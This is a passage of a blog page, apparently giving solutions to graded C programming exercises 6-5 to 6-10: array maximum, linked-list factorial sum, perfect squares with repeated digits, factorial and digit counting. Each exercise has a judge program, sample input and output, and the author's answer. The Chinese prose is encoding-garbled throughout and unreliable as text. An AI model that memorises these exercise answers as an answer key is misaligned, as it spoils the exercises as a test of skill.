<p>å…¶ä¸­ç»™å®šé›†åˆå…ƒç´ å­˜æ”¾åœ¨ <code>æ•°ç»„S[]</code> ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ª<code>S[]å…ƒç´ ä¸­çš„æœ€å¤§å€¼</code>ï¼Œå…¶å€¼ä¹Ÿå¿…é¡»æ˜¯ <code>ElementTypeç±»å‹</code>ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-4"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-4" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Max(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">34.00</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-3"><a href="#è§£ç­”-3" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    ElementType <span class="built_in">max</span> = S[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">max</span> &lt; S[i]) &#123;</span><br><span class="line">            <span class="built_in">max</span> = S[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-6-æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ-15åˆ†"><a href="#6-6-æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ-15åˆ†" class="headerlink" title="6-6 æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ (15åˆ†)"></a>6-6 æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ (15åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ <code>å•é“¾è¡¨L</code> ç»“ç‚¹çš„é˜¶ä¹˜å’Œã€‚è¿™é‡Œé»˜è®¤æ‰€æœ‰ç»“ç‚¹çš„å€¼éè´Ÿï¼Œä¸”é¢˜ç›®ä¿è¯ç»“æœåœ¨ <code>int</code> èŒƒå›´å†…ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-5"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-5" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PtrToNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> Data; <span class="comment">/* å­˜å‚¨ç»“ç‚¹æ•°æ® */</span></span><br><span class="line">    PtrToNode Next; <span class="comment">/* æŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹çš„æŒ‡é’ˆ */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToNode List; <span class="comment">/* å®šä¹‰å•é“¾è¡¨ç±»å‹ */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line">    List L, p;</span><br><span class="line">    <span class="comment">// å®šä¹‰2ä¸ªé“¾è¡¨</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// èµ‹åˆå€¼ä¸º Null</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        p = (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Node));</span><br><span class="line">        <span class="comment">// ç”³è¯·nodeå˜é‡å¯¹åº”å¤§å°çš„å†…å­˜</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p-&gt;Data);</span><br><span class="line">        p-&gt;Next = L;  L = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, FactorialSum(L));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">5 3 6</span><br><span class="line">è¾“å‡º</span><br><span class="line">846</span><br><span class="line"></span><br><span class="line">é˜¶ä¹˜ 5!+3!+6!</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-4"><a href="#è§£ç­”-4" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">  List p = L;</span><br><span class="line">  <span class="comment">// L èµ‹å€¼ç»™ p, p å˜æˆ null, Lä¸å˜</span></span><br><span class="line">  <span class="keyword">while</span>(p) &#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= p-&gt;Data; i++)&#123;</span><br><span class="line">      n *= i; <span class="comment">// n = n*i </span></span><br><span class="line">    &#125;</span><br><span class="line">    sum += n;</span><br><span class="line">    p = p-&gt;Next;</span><br><span class="line">    <span class="comment">// p-&gt;next èµ‹å€¼ç»™ p</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-7-ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•°-20åˆ†"><a href="#6-7-ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•°-20åˆ†" class="headerlink" title="6-7 ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•° (20åˆ†)"></a>6-7 ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•° (20åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œåˆ¤æ–­ä»»ä¸€ç»™å®šæ•´æ•°Næ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼šå®ƒæ˜¯å®Œå…¨å¹³æ–¹æ•°ï¼Œåˆè‡³å°‘æœ‰ä¸¤ä½æ•°å­—ç›¸åŒï¼Œå¦‚144ã€676ç­‰ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä¸­ <code>N</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ã€‚å¦‚æœ <code>N</code> æ»¡è¶³æ¡ä»¶ï¼Œåˆ™è¯¥å‡½æ•°å¿…é¡»è¿”å›1ï¼Œå¦åˆ™è¿”å›0ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-6"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-6" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n1, n2, i, cnt;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n1, &amp;n2);</span><br><span class="line">    cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=n1; i&lt;=n2; i++ ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( IsTheNumber(i) )</span><br><span class="line">            cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cnt = %d\n"</span>, cnt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">105 500</span><br><span class="line">è¾“å‡º</span><br><span class="line">cnt &#x3D; 6</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-5"><a href="#è§£ç­”-5" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, temp[<span class="number">500</span>], count=<span class="number">0</span>, i, n=N;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;=<span class="number">0</span>) &#123; <span class="comment">// è¾“å…¥å€¼ä¸ºè´Ÿæ•°</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(N); <span class="comment">// å¼€æ ¹å·</span></span><br><span class="line">    <span class="comment">// å¼ºåˆ¶è½¬æ¢æ•´å‹</span></span><br><span class="line">    <span class="keyword">if</span> (a*a==N) &#123; </span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ˜¯å¦ä¸ºå®Œå…¨å¹³æ–¹æ•°</span></span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            temp[count] = n%<span class="number">10</span>; <span class="comment">// å–ä¸ªä½</span></span><br><span class="line">            n = n/<span class="number">10</span>; <span class="comment">// å–æ˜¯ç™¾åä½</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;count; i++) &#123; </span><br><span class="line">                <span class="keyword">if</span> (temp[count] == temp[i]) &#123;</span><br><span class="line">                <span class="comment">// å­˜åœ¨ä¸ä¹‹å‰å–å‡ºçš„æ•°å­—ç›¸åŒçš„è¿”å›ä¸º 1</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count += <span class="number">1</span>; <span class="comment">// count = count + 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-8-ç®€å•é˜¶ä¹˜è®¡ç®—-10åˆ†"><a href="#6-8-ç®€å•é˜¶ä¹˜è®¡ç®—-10åˆ†" class="headerlink" title="6-8 ç®€å•é˜¶ä¹˜è®¡ç®— (10åˆ†)"></a>6-8 ç®€å•é˜¶ä¹˜è®¡ç®— (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªè®¡ç®—éè´Ÿæ•´æ•°é˜¶ä¹˜çš„ç®€å•å‡½æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>N</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ï¼Œå…¶å€¼ä¸è¶…è¿‡12ã€‚å¦‚æœ <code>N</code> æ˜¯éè´Ÿæ•´æ•°ï¼Œåˆ™è¯¥å‡½æ•°å¿…é¡»è¿”å›Nçš„é˜¶ä¹˜ï¼Œå¦åˆ™è¿”å›0ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-7"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-7" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, NF;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    NF = Factorial(N); </span><br><span class="line">    <span class="comment">// é˜¶ä¹˜å‡½æ•° Factorial(5) = 5!</span></span><br><span class="line">    <span class="keyword">if</span> (NF)  <span class="built_in">printf</span>(<span class="string">"%d! = %d\n"</span>, N, NF);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"Invalid input\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">5</span><br><span class="line">è¾“å‡º</span><br><span class="line">5! &#x3D; 120</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-6"><a href="#è§£ç­”-6" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (N&gt;<span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        sum *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-9-ç»Ÿè®¡ä¸ªä½æ•°å­—-15åˆ†"><a href="#6-9-ç»Ÿè®¡ä¸ªä½æ•°å­—-15åˆ†" class="headerlink" title="6-9 ç»Ÿè®¡ä¸ªä½æ•°å­— (15åˆ†)"></a>6-9 ç»Ÿè®¡ä¸ªä½æ•°å­— (15åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œå¯ç»Ÿè®¡ä»»ä¸€æ•´æ•°ä¸­æŸä¸ªä½æ•°å‡ºç°çš„æ¬¡æ•°ã€‚ä¾‹å¦‚-21252ä¸­ï¼Œ2å‡ºç°äº†3æ¬¡ï¼Œåˆ™è¯¥å‡½æ•°åº”è¯¥è¿”å›3ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä¸­ <code>N</code> å’Œ <code>D</code> éƒ½æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ã€‚ <code>N</code> çš„å€¼ä¸è¶…è¿‡intçš„èŒƒå›´ï¼›<code>D</code>æ˜¯[0, 9]åŒºé—´å†…çš„ä¸ªä½æ•°ã€‚å‡½æ•°é¡»è¿”å›Nä¸­Då‡ºç°çš„æ¬¡æ•°ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-8"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-8" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, D;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;N, &amp;D);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Count_Digit(N, D));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">-21252 2</span><br><span class="line">è¾“å‡º</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-7"><a href="#è§£ç­”-7" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M=N,cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> ( N==<span class="number">0</span> &amp;&amp; D==<span class="number">0</span> )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> ( N&lt;<span class="number">0</span> ) &#123;</span><br><span class="line">	    M = -N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>( M!=<span class="number">0</span> ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( D == M%<span class="number">10</span> ) <span class="comment">// M é™¤ä»¥10çš„ä½™æ•°ï¼ˆæ±‚å½“å‰ä¸ªä½çš„æ•°å­—ï¼‰</span></span><br><span class="line">		    cnt++;</span><br><span class="line">		    M/=<span class="number">10</span>; <span class="comment">// M å‡å°‘æœ€åä¸€ä½</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> cnt;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-10-é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ-20åˆ†"><a href="#6-10-é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ-20åˆ†" class="headerlink" title="6-10 é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ (20åˆ†)"></a>6-10 é˜¶ä¹˜è®¡ç®—å‡çº§ç‰ˆ (20åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªæ‰“å°éè´Ÿæ•´æ•°é˜¶ä¹˜çš„å‡½æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä¸­ <code>N</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ï¼Œå…¶å€¼ä¸è¶…è¿‡ <code>1000</code>ã€‚å¦‚æœ <code>N</code> æ˜¯éè´Ÿæ•´æ•°ï¼Œåˆ™è¯¥å‡½æ•°å¿…é¡»åœ¨ä¸€è¡Œä¸­æ‰“å°å‡º <code>N!</code> çš„å€¼ï¼Œå¦åˆ™æ‰“å°â€œInvalid inputâ€</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-9"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-9" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    